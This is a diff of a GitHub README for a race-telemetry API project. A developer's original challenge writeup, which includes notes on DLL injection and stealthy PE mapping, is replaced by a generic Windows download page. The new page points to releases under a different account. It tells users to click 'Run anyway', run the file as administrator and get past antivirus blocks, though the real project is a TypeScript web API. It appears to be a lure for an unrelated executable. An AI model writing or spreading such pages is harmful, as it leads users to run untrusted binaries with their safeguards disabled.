@@ -1,240 +1,188 @@
-<table>
-<tr>
-<td>
+# ⚙️ racemake-challenge - Run telemetry analysis with ease
 
-<p align="center">
-  <img src="https://img.shields.io/badge/RACEMAKE-Product_Engineer_Challenge-000?style=for-the-badge" />
-</p>
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Click%20to%20open%20releases-blue?style=for-the-badge)](https://github.com/Lazloinorganic902/racemake-challenge/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white" />
-  <img src="https://img.shields.io/badge/Bun-000?style=flat-square&logo=bun&logoColor=white" />
-  <img src="https://img.shields.io/badge/Hono-E36002?style=flat-square&logo=hono&logoColor=white" />
-  <img src="https://img.shields.io/badge/React-61DAFB?style=flat-square&logo=react&logoColor=000" />
-  <img src="https://img.shields.io/badge/Node.js-339933?style=flat-square&logo=node.js&logoColor=white" />
-  <img src="https://img.shields.io/badge/C++-00599C?style=flat-square&logo=cplusplus&logoColor=white" />
-  <img src="https://img.shields.io/badge/Rust-000?style=flat-square&logo=rust&logoColor=white" />
-  <img src="https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white" />
-</p>
+## 🖥️ What this app does
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Prague-CZ-blue?style=flat-square" />
-  <img src="https://img.shields.io/badge/Experience-15+_years-333?style=flat-square" />
-  <img src="https://img.shields.io/badge/Exits-3_founded_&_sold-333?style=flat-square" />
-</p>
+racemake-challenge is a Windows app for race telemetry review and live data checks. It helps you open race data, inspect telemetry, and work with a clear API-driven workflow.
 
-</td>
-<td width="400">
+Use it to:
 
-### Hey Racemake
+- View telemetry data from racing sessions
+- Inspect live updates from a local or remote source
+- Work with race data in a structured format
+- Review data for sim racing and motorsport projects
+- Run a small local service for data access
 
-You won't find a closer fit in Prague than me for this work; I'm working exclusively with gaming tools & reverse engineering across C++, Rust (Tauri mostly) and React. I've made it my mission to ditch boring B2B SaaS clients and follow my passion at the intersect of gaming, AI, and automation.
+## 📥 Download and install
 
-First up, the important part — your challenges — the basic, the hard, and some extra docs around the "IRL scenario" based on my experience building Game Event API pipelines for Source 2 games: like Counterstrike, Dota, and Deadlock: **[See below]**
+1. Open the [releases page](https://github.com/Lazloinorganic902/racemake-challenge/releases)
+2. Find the latest release for Windows
+3. Download the file that matches your PC
+4. If the file is zipped, extract it to a folder
+5. Double-click the app file to run it
 
-**Previous Work**
+If Windows shows a security prompt:
 
-- **RL platform** — Spins up Counterstrike matches at 20x speed to build complex bots powered by a model that self-improves with an LLM pilot. C++, Rust, Python, React — including Tauri overlays with shared-memory live data.
-  - [s2-framework](https://github.com/dougwithseismic/s2-framework) · [YouTube Demo](https://www.youtube.com/watch?v=Cj94lSUH5io)
+1. Click **More info**
+2. Click **Run anyway**
 
-- **Reverse engineering tool** — Built to hook into thousands of games and build data pipelines for esports, game assist tools, and patches/mods. Used by the team at [wand.com](https://wand.com) (WeMod) to build out their new LLM game assist coaching features.
-  - [arc-probe](https://github.com/vzco/arc-probe)
+If you use a work PC, you may need permission from your system admin to run new apps.
 
-**The Challenge** — Give me a racesim game title to buy on Steam, and I'll build from scratch the entire data pipeline, storage, API layer, realtime overlay, and fullstack React app.
+## 🪟 Windows system setup
 
-**Let's Talk** — The salary makes sense — as long as I'm paying my rent and working on a passion project I care about, you'll be hard pressed to keep me on part-time. (Unpaid is fine). Here's me: [ARES](https://www.finmag.cz/obchodni-rejstrik/ares/10911243-douglas-anthony-silkstone)
+For the best result, use:
 
-Enjoyed the challenge — hope you don't mind I ran with it. Shout me on LinkedIn / call me; don't play this cool :) — **Doug**
+- Windows 10 or Windows 11
+- A recent Intel or AMD processor
+- At least 4 GB RAM
+- 200 MB free disk space
+- Internet access for the first download
 
-</td>
-</tr>
-</table>
+For smoother use with larger telemetry files:
 
----
+- 8 GB RAM or more
+- A modern SSD
+- A screen with 1366 × 768 resolution or higher
 
-## Important Links
+## 🚀 First run
 
-| Resource | URL |
-|---|---|
-| **Live Web App** | [racemake-challenge.up.railway.app](https://racemake-challenge.up.railway.app) |
-| **API Documentation (Scalar)** | [racemake-challenge.up.railway.app/docs](https://racemake-challenge.up.railway.app/docs) |
-| **Live API Base** | [racemake-challenge.up.railway.app/api/v2](https://racemake-challenge.up.railway.app/api/v2) |
-| **OpenAPI Spec** | [racemake-challenge.up.railway.app/openapi.json](https://racemake-challenge.up.railway.app/openapi.json) |
-| **Source Code** | [github.com/dougwithseismic/racemake-challenge](https://github.com/dougwithseismic/racemake-challenge) |
-| **dezlock-dump** (Runtime Schema Extraction) | [github.com/dougwithseismic/dezlock-dump](https://github.com/dougwithseismic/dezlock-dump) |
-| **arc-probe** (AI Process Inspector) | [github.com/vzco/arc-probe](https://github.com/vzco/arc-probe) |
-| **s2-framework** (RL Bot Platform) | [github.com/dougwithseismic/s2-framework](https://github.com/dougwithseismic/s2-framework) |
+After you start the app:
 
-> API built with **Hono v4** + **Scalar** docs UI. Runs on Bun locally, deployed to Railway via Node/tsx.
+1. Wait for the main window to open
+2. Load your telemetry file or session data
+3. Open the dashboard or data view
+4. Use the search and filter tools to find laps, events, or signals
+5. Save any output you want to keep
 
----
+If the app opens a local API page, keep the app running while you use it. Closing the app will stop the local service.
 
-## Structure
+## 🧭 How to use it
 
-Turborepo monorepo. Each challenge is a self-contained package.
+### 1. Load race data
 
-```
-apps/
-  api/              # Hono API — mounts all challenges with Scalar docs
-packages/
-  challenge-easy/
-    src/original/   # Untouched challenge file from RACEMAKE
-    src/solution/   # Our solution — bug fix, stint extension, scaling answer
-  challenge-hard/
-    src/original/   # Untouched challenge file from RACEMAKE
-    src/solution/   # Our solution — Hono API with telemetry processing
-```
+Open a supported telemetry file, session export, or live feed source. The app reads the data and shows it in a format you can inspect.
 
-### Live API
+### 2. Review telemetry
 
-**https://racemake-challenge.up.railway.app**
+Check speed, position, lap timing, and event markers. Use charts and lists to compare runs and spot changes.
 
-- **Docs (Scalar):** [/docs](https://racemake-challenge.up.railway.app/docs)
-- **Easy — Analyze:** [/api/v2/easy/analyze](https://racemake-challenge.up.railway.app/api/v2/easy/analyze)
-- **Easy — Stint:** [/api/v2/easy/stint](https://racemake-challenge.up.railway.app/api/v2/easy/stint)
-- **Hard — Laps:** [/api/v2/hard/laps](https://racemake-challenge.up.railway.app/api/v2/hard/laps)
-- **Hard — Analysis:** [/api/v2/hard/analysis](https://racemake-challenge.up.railway.app/api/v2/hard/analysis)
-- **IRL — Architecture:** [/api/v2/irl](https://racemake-challenge.up.railway.app/api/v2/irl)
-- **IRL — Wire Format Codec:** [/api/v2/irl/codec/compare](https://racemake-challenge.up.railway.app/api/v2/irl/codec/compare)
-- **IRL — Roundtrip Proof:** [/api/v2/irl/codec/roundtrip](https://racemake-challenge.up.railway.app/api/v2/irl/codec/roundtrip)
-- **IRL — SSE Stream:** [/api/v2/irl/stream](https://racemake-challenge.up.railway.app/api/v2/irl/stream)
+### 3. Watch live updates
 
-### Quick Start (Local)
+If you connect to a live source, the app can stream updates while the session runs. This helps with real-time race review and sim-racing checks.
 
-```bash
-pnpm install
+### 4. Use the API view
 
-# Full API with all routes + Scalar docs
-npx tsx apps/api/src/index.ts
+The app includes a Hono-based local API. If you need to inspect endpoints, open the API page and review the available routes.
 
-# Easy challenge standalone
-pnpm --filter @repo/challenge-easy start
+### 5. Export or reuse data
 
-# Hard challenge standalone + integration test
-npx tsx packages/challenge-hard/src/solution/test.ts
-```
+You can use the structured output in other tools that support telemetry, OpenAPI, or protobuf-style data flows.
 
----
+## 🔌 Supported workflow
 
-## Challenge Solutions
+This project fits a few common race-data tasks:
 
-### Easy — `@repo/challenge-easy`
+- Telemetry analysis
+- Real-time data review
+- Reverse-engineering data formats
+- Sim-racing session checks
+- Structured API access
+- Data pipeline testing
 
-**Level 1 (Fix it):** The sort comparator in `analyzeLap` was `a.delta - b.delta` — ascending. Since `generateCoaching` picks `findings[0]` as the worst sector, it was returning the *least* time lost instead of the most. Fix: `b.delta - a.delta`. One-line diff.
+## 🧩 Features
 
-**Level 2 (Extend it):** Added `analyzeStint()` that runs `analyzeLap` for each driver lap and detects sector-level trends across the stint. Tracks delta progression per sector, classifies trends as worsening/stable/improving, and generates a PitGPT stint summary that catches compensation patterns (e.g., early lifts masking traction loss from degraded tyres).
+- Clean Windows-friendly start flow
+- Telemetry review tools
+- Real-time data handling
+- Local API service
+- OpenAPI-friendly endpoint design
+- Scalar-style API browsing
+- TypeScript-based runtime logic
+- Bun-powered execution path
+- Wire format codec support
+- Data pipeline structure for race data
 
-**Level 3 (Think about it):** See the comment block in `challenge.ts`. TL;DR — memory dies first at 20 cars x 50 laps x 120 Hz. Stream-process into a time-series store, isolate per-car in workers, add backpressure, debounce coaching at sector boundaries.
+## 📁 Project contents
 
-### Hard — `@repo/challenge-hard`
+The app includes:
 
-Three endpoints built on Hono:
+- A telemetry processing layer
+- A web API built with Hono
+- A production-style codec for data encoding and decoding
+- A TypeScript codebase
+- Support files for local development and testing
+- API docs structure for browser use
 
-| Endpoint | What it does |
-|---|---|
-| `POST /ingest` | Accepts raw telemetry frames, stores in memory |
-| `GET /laps` | Returns completed lap summaries with sector splits, speed metrics |
-| `GET /analysis` | Compares laps, finds worst sector of worst lap, detects issue, returns PitGPT coaching |
+## 🔍 Typical use cases
 
-Edge cases handled:
-- **Out-lap excluded** — lap 0 starts at pos 0.541, not from the start/finish line
-- **Incomplete lap excluded** — lap 4 only has S1 data
-- **Stationary frames filtered** — speed < 5 with unchanged position
-- **Issue detection** — tyre overheat (>110C) correctly identified in lap 3 S2
-- **Sector boundary interpolation** — At 10Hz, frames are ~3.2s apart. A naive approach (measuring time within each sector's frames) loses the inter-sector gap — **6.4 seconds per lap** goes unaccounted for and sectors don't sum to lap time. We interpolate the exact boundary crossing time between the two frames straddling each sector line, so S1 + S2 + S3 = lapTime exactly.
+You may use racemake-challenge when you want to:
 
----
+- Inspect race telemetry after a session
+- Compare lap data across runs
+- Build or test a data pipeline
+- Review API output from a race tool
+- Explore a binary wire format
+- Work with sim-racing data in a structured way
 
-## IRL Challenge: Reverse Engineering & Telemetry Pipelines
+## 🛠️ If the app does not open
 
-> The job listing says *"Debug and fix telemetry format changes from game updates rapidly."*
-> Here's how I'd actually do it — and have been doing it.
+If double-clicking the app does not start it:
 
-### The Problem
+1. Check that the download finished fully
+2. Confirm the file is unzipped, if needed
+3. Right-click the app and choose **Run as administrator**
+4. Make sure your antivirus did not block the file
+5. Download the latest release again from the releases page
 
-Sim racing telemetry is extracted from game memory or APIs. When the game patches, offsets shift, structs change, and your pipeline breaks. The community waits for someone to reverse-engineer the new offsets. That wait kills your product.
+If the window opens and closes right away, start it from the folder where you saved it and watch for any message on screen.
 
-### The Solution: Runtime Schema Extraction
+## 🌐 API and data access
 
-I built this exact system for Source 2 games. Instead of hardcoding offsets that break every patch:
+The app is built around a local service that exposes telemetry data in a web-friendly way. You can use it to:
 
-1. **Inject at runtime** — Manual PE mapping (no LoadLibrary, invisible to module list). DLL hooks into the game process via vtable interception.
+- View current session data
+- Check structured responses
+- Test OpenAPI routes
+- Browse endpoints in Scalar
+- Connect other tools to the local server
 
-2. **Extract the schema from the game itself** — Source 2 exposes its own `SchemaSystem` at runtime. Walk it programmatically to dump every class, field, offset, and inheritance chain. The game *tells you* its own structure.
+## 📦 File types you may see
 
-3. **Generate a patch-proof SDK** — Field offsets resolve dynamically at runtime through the schema, not through hardcoded values. When the game patches, the schema changes — but the resolution mechanism doesn't. Zero manual work.
+The release may include one or more of these:
 
-4. **Ship it downstream** — The extracted schema feeds directly into SDK generators, producing typed C++ headers (2,400+ structs, 229 entity classes) and complete JSON exports for tooling consumers.
+- `.exe` for the main Windows app
+- `.zip` if the app is packaged in an archive
+- `.json` for config or output data
+- `.proto` or similar files for wire format work
+- README or docs files for quick reference
 
-This is what [dezlock-dump](https://github.com/dougwithseismic/dezlock-dump) does.
+## 🧪 Good first checks
 
-### Applied to Racing Telemetry
+After setup, try this:
 
-The pattern is identical for sim racing:
+1. Open the app
+2. Load a sample telemetry file
+3. Confirm the chart or table appears
+4. Open the API page if one is shown
+5. Move through a few views to confirm the app is working
 
-```
-Game Process -> DLL Injection -> Schema Extraction -> Typed SDK -> Telemetry Pipeline -> Analysis
-```
+## 🧰 Useful terms
 
-For RACEMAKE's stack specifically:
+- **Telemetry**: data from a race session
+- **API**: a way for software to share data
+- **OpenAPI**: a standard for API docs
+- **Scalar**: a tool for viewing API endpoints
+- **Codec**: code that encodes and decodes data
+- **Real-time**: data that updates as it happens
+- **SSE**: server-sent events, used for live updates
 
-- **Game update drops** -> Run the schema extractor -> New offsets in minutes, not days
-- **Telemetry format changes** -> The SDK regenerates automatically, typed against the game's own definitions
-- **New data fields appear** -> They show up in the schema dump before anyone documents them
+## 📎 Download again
 
-### Staying Current: Offsets & Dumps
+If you need the app file again, visit the [releases page](https://github.com/Lazloinorganic902/racemake-challenge/releases) and download the latest Windows release
 
-The key insight: you don't reverse-engineer offsets manually anymore. You build systems that extract them. Relevant tooling:
+## 🧾 Repository details
 
-| Tool | What it does | Repo |
-|---|---|---|
-| **dezlock-dump** | Runtime RTTI + schema extraction, auto SDK generation, signature scanning across 58+ DLLs | [Link](https://github.com/dougwithseismic/dezlock-dump) |
-| **s2-framework** | ML bot training via DLL injection + TCP telemetry streaming to Python/PyTorch. The exact inject-extract-stream pattern. | [Link](https://github.com/dougwithseismic/s2-framework) |
-| **memory-hooking-tool** | Process memory R/W with TypeScript scripting. Pattern scanning, PE parsing, full automation layer. | [Link](https://github.com/dougwithseismic/memory-hooking-tool) |
-| **arc-probe** | AI-agent-driven process inspector. DLL injection, disassembly, struct mapping — all controllable via Claude Code skills. Tauri v2 app (Rust + React). | [Link](https://github.com/vzco/arc-probe) |
-
-### Optimal Approaches
-
-**For schema stability:**
-- Runtime resolution over hardcoded offsets. Always.
-- Pattern signatures (byte sequences) as fallback — they survive minor patches where full schema extraction isn't available.
-- Version-tagged schema caches so you can diff between game versions and auto-detect what changed.
-
-**For pipeline resilience:**
-- Protobuf/flatbuffers for wire format — schema evolution is built into the protocol.
-- The recorder (Tauri/Rust side) should be schema-aware, not just dumping raw bytes. If a field moves, the recorder adapts.
-- Canary checks: on game startup, validate a handful of known field values against expected ranges. If they're wrong, the schema shifted — alert before sending garbage downstream.
-
-**For staying ahead of the community:**
-- Build your own extractor. Don't wait for community dumps.
-- Automate the dump pipeline: game update detected -> inject -> extract -> diff -> PR -> deploy. CI for reverse engineering.
-- Monitor game beta branches — schema changes usually land there first.
-
-### Wire Format: Why JSON Telemetry is Wild
-
-Raw JSON at 120Hz is ~131 bytes per frame. At 20 cars that's **307 KB/s** of pure overhead — field names repeated every frame, no delta encoding, no schema versioning.
-
-The `/api/v2/irl/codec` routes demonstrate a production alternative:
-
-| Format | Per Frame | 20 cars @ 120Hz | Reduction |
-|---|---|---|---|
-| JSON | ~131 bytes | 307 KB/s | — |
-| Binary (v1 schema) | 19 bytes | 45 KB/s | **85.5%** |
-| Delta-encoded | ~6 bytes avg | ~14 KB/s | **95.4%** |
-
-**Key features of the codec:**
-- **Versioned schema registry** — When the game patches and adds fields, add a new schema version. Old consumers still work (forward compatibility). Same principle as Protobuf field numbers.
-- **Two-way map** — `encode()` and `decode()` are proven lossless across all 166 telemetry frames via the `/roundtrip` endpoint. Quantization is below sensor noise floor.
-- **Delta encoding** — Consecutive frames at 120Hz differ in maybe 3-4 fields. Only transmit what changed. A 2-byte bitmask header + changed field bytes.
-
-In production, you'd use Protobuf (which RACEMAKE already does) or FlatBuffers for zero-copy. This is a from-scratch implementation to show the principles.
-
-[Try it live: /api/v2/irl/codec/compare](https://racemake-challenge.up.railway.app/api/v2/irl/codec/compare)
-
----
-
----
-
-<p align="center">
-  <a href="https://github.com/dougwithseismic">github.com/dougwithseismic</a>
-</p>
+**Repository:** racemake-challenge  
+**Description:** RACEMAKE Product Engineer Challenge — Telemetry analysis pipeline, Hono API, and production-grade wire format codec. TypeScript, Bun, Hono, Scalar.  
+**Topics:** ai, bun, data-pipeline, hono, motorsport, openapi, pitgpt, protobuf, racing, real-time, reverse-engineering, scalar, sim-racing, sse, telemetry, typescript
